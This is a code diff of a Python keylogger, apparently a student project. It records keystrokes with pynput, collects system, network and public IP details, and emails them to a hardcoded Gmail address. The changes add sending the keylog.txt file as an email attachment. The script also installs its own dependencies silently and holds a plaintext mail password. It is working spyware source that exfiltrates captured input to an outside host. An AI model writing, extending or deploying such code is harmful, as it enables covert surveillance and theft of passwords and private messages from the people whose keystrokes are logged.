@@ -4,14 +4,17 @@ import logging
 import smtplib
 import ssl
 import psutil
+import time
 import platform
 from datetime import datetime
 from requests import get
 from pynput.keyboard import Key, Listener
+from email.mime.multipart import MIMEMultipart 
+from email.mime.text import MIMEText 
+from email.mime.application import MIMEApplication
 subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
 subprocess.check_call([sys.executable, "-m", "pip", "install", "psutil"])
 subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
-
 
 ## Initialise variables
 keys = []
@@ -72,14 +75,10 @@ def on_press(key):
 # Send logging content to Email
 def email(keys):
     message = ""
-    message += f"{sysInfo}{netInfo}{pubIP}======================================== Recorded Keystrokes ========================================\n"
+    message += f"{sysInfo}{netInfo}{pubIP}======================================== Past 50 Recorded Keystrokes ========================================\n"
     for key in keys:
         # Replace miscellenous characters to make it more readable
         x = key.replace("'", "")
-        if key == "Key.space":
-            x = "SPACE"
-        elif key == "Key.backspace":
-            x = "BACKSPACE"
         message += x
     # Debug terminal message
     print(message)
@@ -96,11 +95,30 @@ def sendEmail(message):
     password = "keylog123##"
     # Receiver's email
     receiverEmail = "fypkeylogger@gmail.com"
+    
+    # Delay so that if file does not exist prior, it will exist then code below will run and detect file
+    time.sleep(0.2)
+    # Setting text file attachment (keylog.txt)
+    attachmentMessage = MIMEMultipart('mixed')
+    attachmentMessage['Subject'] = str(datetime.now())
+    attachmentPath = "keylog.txt"
+    try:
+        with open(attachmentPath, "rb") as attachment:
+            p = MIMEApplication(attachment.read(),_subtype="text")	
+            p.add_header('Content-Disposition', "attachment; filename= %s" % attachmentPath.split("\\")[-1]) 
+            attachmentMessage.attach(p)
+    except Exception as e:
+        print(str(e))
+    attachmentMessage = attachmentMessage.as_string()
+
+    # Send email
     context = ssl.create_default_context()
     with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
         server.login(senderEmail, password)
+        # Sending text file
+        server.sendmail(senderEmail, receiverEmail, attachmentMessage)
+        # Sending system information
         server.sendmail(senderEmail, receiverEmail, message)
-
 
 # Record keystrokes
 with Listener(on_press=on_press) as listener:
